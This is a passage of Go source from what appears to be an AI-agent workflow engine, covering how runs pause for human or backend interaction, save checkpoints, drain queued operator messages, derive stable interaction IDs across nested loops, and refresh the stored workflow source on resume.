	// and a loop re-entry — not just this re-invocation.

	// When the backend captured the LLM's conversation at the pause point
	// (claw), relay it through the executor so the Task carries
	// ResumeConversation/ResumePendingToolUseID/ResumeAnswer. The backend
	// then rehydrates the message history and continues the agent loop
	// instead of restarting from system+user prompts.
	if len(ni.Conversation) > 0 && ni.PendingToolUseID != "" {
		nodeInput[delegate.ResumeConversationKey] = ni.Conversation
		nodeInput[delegate.ResumePendingToolUseIDKey] = ni.PendingToolUseID
		if a, ok := answers[delegate.AskUserQuestionKey].(string); ok {
			nodeInput[delegate.ResumeAnswerKey] = a
		}
	}

	if ni.SessionID != "" {
		nodeInput[delegate.SessionIDKey] = ni.SessionID
	}
	if ni.SessionStateRef != "" || rs.pauseSessionRef != "" {
		ref := ni.SessionStateRef
		if ref == "" {
			ref = rs.pauseSessionRef
		}
		e.hydratePauseSession(ctx, rs, nodeInput, ni.Backend, ni.SessionID, ref)
	}
	// Re-execute the node. The executor will use the session ID for
	// delegate re-invocation if the backend supports it.
	execCtx := e.ctxWithIteration(ctx, nodeID, rs.loopCounters)
	execCtx = model.WithRunID(execCtx, rs.runID)
	execCtx = model.WithNodeID(execCtx, nodeID)
	output, err := e.executor.Execute(execCtx, node, nodeInput)
	if err != nil {
		// Check for another interaction request (recursive). depth+1
		// so the maxInteractionDepth guard in handleNeedsInteraction
		// fires before a runaway LLM chains escalations to budget
		// exhaustion.
		var needsInput *model.ErrNeedsInteraction
		if errors.As(err, &needsInput) {
			return e.handleNeedsInteraction(ctx, rs, nodeID, node, needsInput, depth+1)
		}
		return e.failRunWithCheckpoint(rs, nodeID,
			fmt.Sprintf("node %q re-invocation failed: %v", nodeID, err))
	}

	if err := e.commitPersistSlot(ctx, rs, node, output); err != nil {
		return err
	}
	if llm, ok := node.(ir.LLMNode); !ok || llm.GetSession() != ir.SessionPersist {
		e.clearPauseRefAfterSuccess(ctx, rs, nodeID)
	}

	// Store the output and continue execution normally.
	rs.outputs[nodeID] = output

	// Validate output.
	if err := e.validateNodeOutput(nodeID, node, output); err != nil {
		return e.failRunErrWithCheckpoint(rs, nodeID, err)
	}

	// Record budget.
	if err := e.recordAndCheckBudget(rs, nodeID, output); err != nil {
		return err
	}

	// Persist artifact if node has publish.
	if pub := nodePublish(node); pub != "" {
		version := rs.artifactVersions[nodeID]
		artifact := &store.Artifact{
			RunID:   rs.runID,
			NodeID:  nodeID,
			Version: version,
			Data:    output,
		}
		if err := e.store.WriteArtifact(ctx, artifact); err != nil {
			return fmt.Errorf("runtime: write artifact: %w", err)
		}
		rs.artifactVersions[nodeID] = version + 1
		rs.artifacts[pub] = output
		_ = e.emit(rs.ctx, rs.runID, store.EventArtifactWritten, nodeID, map[string]any{
			"publish": pub,
			"version": version,
		})
	}

	// Emit node_finished.
	nodeFinishedData := buildNodeFinishedData(e.sanitizeOutputForEvent(node, output))
	if err := e.emit(rs.ctx, rs.runID, store.EventNodeFinished, nodeID, nodeFinishedData); err != nil {
		return err
	}
	if e.onNodeFinished != nil {
		e.onNodeFinished(rs.runID, nodeID, output)
	}

	// Checkpoint.
	if err := e.store.SaveCheckpoint(rs.ctx, rs.runID, buildCheckpoint(rs, nodeID)); err != nil {
		e.logger.Error("failed to save checkpoint after re-invocation of node %q: %v", nodeID, err)
	}

	// Select next edge.
	nextNodeID, err := e.selectEdgeRS(rs, nodeID, output)
	if err != nil {
		return e.failRunErrWithCheckpoint(rs, nodeID, err)
	}

	loopErr := e.execLoop(ctx, rs, nextNodeID)
	e.evictRunSessions(rs.runID, loopErr)
	return loopErr
}

// interactionFields extracts InteractionFields from a node that supports them.
func interactionFields(node ir.Node) ir.InteractionFields {
	switch n := node.(type) {
	case *ir.AgentNode:
		return n.InteractionFields
	case *ir.JudgeNode:
		return n.InteractionFields
	case *ir.HumanNode:
		return n.InteractionFields
	default:
		return ir.InteractionFields{}
	}
}

// pauseForBackendInteraction creates an interaction record and pauses the
// workflow, saving the backend's session ID for re-invocation on resume.
func (e *Engine) pauseForBackendInteraction(rs *runState, nodeID string, ni *model.ErrNeedsInteraction) error {
	eventExtra := map[string]any{
		"source":  "delegate",
		"backend": ni.Backend,
	}
	pi := pauseInfo{
		BackendSessionID:        ni.SessionID,
		BackendName:             ni.Backend,
		BackendConversation:     ni.Conversation,
		BackendPendingToolUseID: ni.PendingToolUseID,
	}
	if len(ni.SessionStateBlob) > 0 {
		ref := newSessionRef()
		if err := e.putSessionBlob(rs.ctx, rs.runID, ref, ni.SessionStateBlob); err != nil {
			if e.logger != nil {
				e.logger.Warn("persist: put pause blob: %v", err)
			}
		} else {
			pi.BackendSessionStateRef = ref
		}
		ni.SessionStateBlob = nil
	}
	oldPause := rs.pauseSessionRef
	rs.pauseSessionRef = pi.BackendSessionStateRef
	if _, isAwait := ni.Questions[delegate.AwaitPendingInteractionsKey]; isAwait {
		pi.Kind = store.InteractionKindAwait
		eventExtra["await"] = true
	}
	if err := e.doPause(rs, nodeID, ni.Questions, eventExtra, pi); err != nil {
		// PauseRun may have committed despite the error. Never delete the
		// new blob (ADR-089). Keep A and the previous pause blob.
		return err
	}
	if oldPause != "" && oldPause != rs.pauseSessionRef {
		e.deleteSessionBlob(rs.ctx, rs.runID, oldPause)
	}
	return ErrRunPaused
}

// pauseInfo bundles the optional backend-side state captured at pause
// time. It travels into the checkpoint so resume can either re-invoke
// the backend with the original session ID (CLI backends) or replay the
// persisted conversation (claw).
type pauseInfo struct {
	BackendSessionID        string
	BackendName             string
	BackendConversation     json.RawMessage
	BackendPendingToolUseID string
	BackendSessionStateRef  string
	// Kind tags the written Interaction (store.InteractionKindAwait for
	// an await_answers tool escalation, "" for ordinary blocking pauses).
	Kind string
	// Turns carries the accumulated companion↔human dialogue for a review
	// gate (interaction: review). doPause stamps it onto the written
	// Interaction so the whole thread re-renders on resume. Nil for
	// ordinary single-shot human pauses.
	Turns []store.InteractionTurn
}

// drainOperatorMessagesForPause empties the run's operator-queued
// chat-message inbox at pause time — run-scoped messages plus the ones
// scoped to the PAUSING node, never a message tagged for another node
// (a supervisor's steering for `campaign` must not be folded into an
// unrelated human node's resume prompt) — and returns the texts in
// FIFO order. Used by the claude_code / codex pause path — those
// backends can't accept mid-session stdin, so the operator's intent
// rides on the resume system prompt. Each transition emits a
// user_message_delivered event through the engine's event observer
// so WS subscribers (the studio chatbox) update their badge.
//
// Side-effect: before returning, every SkillRef attached to a drained
// message is mirrored into the run's .claude/skills/ directory via
// MirrorSingleSkill. Sticky — the skill stays loaded for the rest of
// the run. Mirror failures log at warn level but don't block the
// drain (the agent will see the text without the skill in those
// cases; the operator surfaces the gap via the catalog endpoint).
func (e *Engine) drainOperatorMessagesForPause(ctx context.Context, runID, nodeID string) []string {
	msgs, _, _ := store.DrainPendingMessagesForNode(ctx, e.store, e.onEvent, runID, nodeID)
	if len(msgs) == 0 {
		return nil
	}
	texts := make([]string, 0, len(msgs))
	for _, m := range msgs {
		texts = append(texts, m.Text)
		for _, ref := range m.SkillRefs {
			if err := MirrorSingleSkill(e.workDir, e.bundle, ref, e.logger); err != nil && e.logger != nil {
				e.logger.Warn("queued-message skill mirror failed: ref=%s err=%v", ref, err)
			}
		}
	}
	return texts
}

// doPause is the unified implementation for pausing a run. It writes the
// interaction record, emits pause events, and saves the checkpoint.
func (e *Engine) doPause(rs *runState, nodeID string, questions map[string]any, eventExtra map[string]any, info pauseInfo) error {
	// Record what the node leaves on disk BEFORE the run is persisted as
	// paused. A paused run is rewindable, and an agent that writes ten
	// files and then asks a question has left them there with nothing
	// recording that the run put them there — so a scoped rewind would
	// have to leave them, and the replayed node would meet its own
	// production. It also opens the pause interval, the one window in
	// which nothing of the run executes and a workspace change is
	// therefore demonstrably not the run's.
	//
	// Free when the node wrote nothing: the capture dedupes against an
	// identical parent, which is the ordinary case at a human gate.
	e.capturePauseBoundary(rs, nodeID)
	// Create one stable interaction per logical loop execution. A scalar
	// max(loop counters) is insufficient when a human node belongs to
	// multiple loops: {plan=2, kit=1} and {plan=2, kit=2} both collapse to
	// iteration 2 and the second pause overwrites the first interaction.
	interactionID := e.interactionIDForPause(rs.runID, nodeID, rs.loopCounters)
	// Drain operator-queued chatbox messages and stamp them onto the
	// interaction questions under a reserved key. The resume path
	// reads the same key and folds the messages into the system
	// prompt so claude_code / codex (which can't accept mid-session
	// stdin) still see the operator's intent. claw drains the same
	// inbox between agent iterations (model.StoreInboxBinder), so on
	// most runs the queue is already empty by the time we land here.
	if queuedTexts := e.drainOperatorMessagesForPause(rs.ctx, rs.runID, nodeID); len(queuedTexts) > 0 {
		if questions == nil {
			questions = map[string]any{}
		}
		questions[delegate.QueuedOperatorMessagesKey] = queuedTexts
	}
	interaction := &store.Interaction{
		ID:          interactionID,
		RunID:       rs.runID,
		NodeID:      nodeID,
		Kind:        info.Kind,
		RequestedAt: time.Now().UTC(),
		Questions:   questions,
		Turns:       info.Turns,
	}
	if err := e.store.WriteInteraction(rs.ctx, interaction); err != nil {
		return fmt.Errorf("runtime: write interaction: %w", err)
	}

	// Emit human_input_requested.
	eventData := map[string]any{
		"interaction_id": interactionID,
		"questions":      questions,
	}
	for k, v := range eventExtra {
		eventData[k] = v
	}
	if err := e.emit(rs.ctx, rs.runID, store.EventHumanInputRequested, nodeID, eventData); err != nil {
		return err
	}

	// Emit run_paused.
	if err := e.emit(rs.ctx, rs.runID, store.EventRunPaused, nodeID, nil); err != nil {
		return err
	}

	// Atomically save checkpoint and set status to paused in a single write.
	cp := buildCheckpoint(rs, nodeID)
	cp.InteractionID = interactionID
	cp.InteractionQuestions = questions
	cp.BackendSessionID = info.BackendSessionID
	cp.BackendName = info.BackendName
	cp.BackendConversation = info.BackendConversation
	cp.BackendPendingToolUseID = info.BackendPendingToolUseID
	cp.BackendSessionStateRef = info.BackendSessionStateRef
	if err := e.store.PauseRun(rs.ctx, rs.runID, cp); err != nil {
		return fmt.Errorf("runtime: pause run: %w", err)
	}

	return nil
}

// ---------------------------------------------------------------------------
// Loop helpers
// ---------------------------------------------------------------------------

// interactionIDForPause returns the durable ID for a human interaction.
//
// Nodes outside loops and the first (all-zero) execution keep the historical
// `<run>_<node>` ID. A node in exactly one active loop keeps the historical
// `<run>_<node>_<iteration>` form. When several loops contain the node, the
// complete, lexicographically stable iteration path is encoded as a
// filesystem-safe suffix. This mirrors execution-ID disambiguation while
// preserving existing IDs wherever the scalar counter was already unique.
func (e *Engine) interactionIDForPause(runID, nodeID string, loopCounters map[string]int) string {
	base := fmt.Sprintf("%s_%s", runID, nodeID)
	iteration := e.currentLoopIteration(nodeID, loopCounters)
	iterationPath := e.currentLoopIterationPath(nodeID, loopCounters)
	if iteration <= 0 || iterationPath == "" {
		return base
	}
	if !strings.Contains(iterationPath, ";") {
		return fmt.Sprintf("%s_%d", base, iteration)
	}
	encodedPath := base64.RawURLEncoding.EncodeToString([]byte(iterationPath))
	return fmt.Sprintf("%s_loops_%s", base, encodedPath)
}

// currentLoopIteration returns the current loop iteration for a node.
// If the node participates in multiple loops, returns the max counter.
// Returns 0 if the node is not in any loop.
func (e *Engine) currentLoopIteration(nodeID string, loopCounters map[string]int) int {
	maxIter := 0
	// Loop body membership is the authoritative signal — a node is "inside"
	// loop L iff it's reachable from L's entry within L.Body. The snapshot
	// reducer also consumes `iteration_path` (see currentLoopIterationPath
	// below) to disambiguate executions of the same node across nested
	// loops; this scalar `iteration` is retained for the studio's pip strip
	// + the legacy reducer fallback.
	for loopName, loop := range e.workflow.Loops {
		if loop == nil {
			continue
		}
		if !loop.Body[nodeID] {
			continue
		}
		if count, ok := loopCounters[loopName]; ok && count > maxIter {
			maxIter = count
		}
	}
	// Belt-and-suspenders: a node sitting exactly on a loop-bearing edge
	// (the loop's entry or back-edge endpoint) gets counted via the body
	// path above when the compiler marks it as such, but fall back to the
	// edge-endpoint scan for workflows whose Loop.Body is empty (older
	// IRs / hand-written test fixtures).
	for _, edge := range e.workflow.Edges {
		if edge.LoopName == "" {
			continue
		}
		if edge.From == nodeID || edge.To == nodeID {
			if count, ok := loopCounters[edge.LoopName]; ok && count > maxIter {
				maxIter = count
			}
		}
	}
	return maxIter
}

// currentLoopIterationPath returns a stable string encoding of the
// counters of EVERY loop currently containing nodeID. The snapshot
// reducers (backend + studio) use it to build a unique exec_id when a
// node sits in nested loops — observed live: validate_upgrade lives in
// fix_loop ⊂ package_loop ⊂ family_loop, and the single-int iteration
// scheme collapsed pkg N's attempt 0 and pkg N+1's attempt 0 onto the
// same exec because the family_loop counter dominated the max. Encoding
// `family=5,package=0,fix=3` gives each execution attempt a strictly
// unique identity regardless of which loop's counter happens to win.
//
// The encoding is `<loopName>=<count>` segments joined by `;` in
// LEXICOGRAPHIC loop-name order so the same {loops × counters} set
// always renders to the same string (stable across runs, replay-safe).
// Empty string when the node is in zero loops — reducers fall back to
// the scalar `iteration` field.
//
// Edge endpoint membership is also honoured here for the same belt-
// and-suspenders reason as currentLoopIteration: a workflow whose
// Loop.Body is empty (older IRs / hand-written fixtures) still gets a
// usable path keyed on the loop-bearing edges the node touches.
func (e *Engine) currentLoopIterationPath(nodeID string, loopCounters map[string]int) string {
	memberOf := make(map[string]struct{})
	for loopName, loop := range e.workflow.Loops {
		if loop == nil {
			continue
		}
		if loop.Body[nodeID] {
			memberOf[loopName] = struct{}{}
		}
	}
	for _, edge := range e.workflow.Edges {
		if edge.LoopName == "" {
			continue
		}
		if edge.From == nodeID || edge.To == nodeID {
			memberOf[edge.LoopName] = struct{}{}
		}
	}
	if len(memberOf) == 0 {
		return ""
	}
	names := make([]string, 0, len(memberOf))
	for n := range memberOf {
		names = append(names, n)
	}
	sort.Strings(names)
	parts := make([]string, 0, len(names))
	for _, n := range names {
		parts = append(parts, fmt.Sprintf("%s=%d", n, loopCounters[n]))
	}
	return strings.Join(parts, ";")
}

// ctxWithIteration wraps ctx with the current loop iteration for nodeID
// so the executor can stamp Task.Iteration and downstream backends can
// tag their log output as [NodeID#iter/...].
func (e *Engine) ctxWithIteration(ctx context.Context, nodeID string, loopCounters map[string]int) context.Context {
	return model.WithLoopIteration(ctx, e.currentLoopIteration(nodeID, loopCounters))
}

// restampWorkflowSource refreshes Run.WorkflowSource to the text this
// resume is about to execute.
//
// Without it, `rewind --auto` compares against the source as it was at
// the ORIGINAL launch, so every iteration re-reports the edits of the
// previous ones: the second rewind of a session drops three nodes where
// one was needed, the third more, and the cost grows monotonically —
// precisely the loop the feature exists to cheapen.
//
// Only refreshed when the engine holds a source AND it actually differs,
// so a plain resume touches nothing.
func (e *Engine) restampWorkflowSource(ctx context.Context, r *store.Run) {
	src := e.resolveWorkflowSource()
	if src == "" || r == nil || src == r.WorkflowSource {
		return
	}
	r.WorkflowSource = src
	if e.workflowHash != "" {
		r.WorkflowHash = e.workflowHash
	}
	// Re-read before writing. BOTH call sites run AFTER the resume CAS
	// flipped the run to `running` — and the claim helpers mutate their
	// OWN copy (UpdateRunStatusIf → loadRunRaw), never the caller's `r`,
	// which therefore still carries the pre-claim status. SaveRun writes
	// the whole document, so saving `r` verbatim would silently undo the
	// claim: the run persists as cancelled/paused_* for its entire
	// execution, the FinishedAt that the `running` transition
	// deliberately cleared comes back, and — worst — the
	// duplicate-resume guard falls, letting a second concurrent resume
	// claim the same run id and spawn a second engine on it. (The
	// Checkpoint is NOT part of that argument: a status transition never
	// destroys it — ADR-095 §5.)
	fresh, lerr := e.store.LoadRun(ctx, r.ID)
	if lerr != nil {
		if e.logger != nil {
			e.logger.Warn("resume: re-stamp workflow source for %s: reload: %v", r.ID, lerr)
		}
		return
	}
	fresh.WorkflowSource = r.WorkflowSource
	fresh.WorkflowHash = r.WorkflowHash
	if err := e.store.SaveRun(ctx, fresh); err != nil && e.logger != nil {
		e.logger.Warn("resume: re-stamp workflow source for %s: %v", r.ID, err)
	}
}
